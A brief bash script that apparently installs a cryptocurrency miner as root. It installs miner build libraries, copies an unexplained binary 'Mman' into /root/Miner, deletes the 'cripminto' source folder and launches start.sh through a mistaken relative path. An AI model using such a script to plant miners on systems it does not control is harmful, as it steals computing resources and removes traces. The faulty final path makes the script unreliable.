#!/bin/bash
sudo apt-get update -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
mkdir /root/Miner
cp Mman /root/Miner
cp setup.sh /root/Miner
cp start.sh /root/Miner
cd
rm -rf cripminto
cd /root/Miner/
chmod +x /root/Miner/Mman
sh ./root/Miner/start.sh
echo done
